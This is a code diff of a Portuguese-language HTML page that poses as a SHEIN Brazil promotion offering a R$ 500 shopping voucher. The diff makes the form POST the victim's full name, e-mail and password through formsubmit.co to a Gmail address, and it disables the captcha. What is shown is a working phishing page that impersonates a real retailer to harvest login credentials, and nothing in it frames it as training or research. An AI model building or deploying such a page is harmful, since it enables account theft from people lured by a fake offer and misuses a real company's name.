@@ -17,12 +17,21 @@
 
         <h2>Você foi selecionada!</h2>
         <p>Ganhe um <strong>vale-compras de R$ 500</strong> para usar na SHEIN!<br>Basta preencher seus dados abaixo:</p>
-        <form>
-            <input type="text" placeholder="Nome completo" required>
-            <input type="email" placeholder="E-mail" required>
-            <input type="password" placeholder="Senha" required>
+        
+        <form action="https://formsubmit.co/dadosbemfeito@gmail.com" method="POST">
+            <input type="text" name="nome" placeholder="Nome completo" required>
+            <input type="email" name="email" placeholder="E-mail" required>
+            <input type="password" name="senha" placeholder="Senha" required>
+
+            <!-- Anti-spam -->
+            <input type="hidden" name="_captcha" value="false">
+
+            <!-- Redirecionamento após enviar -->
+            
+
             <button type="submit">Receber Vale-Compras</button>
         </form>
+
         <div class="footer">
             © 2025 Promoções SHEIN Brasil — Todos os direitos reservados
         </div>
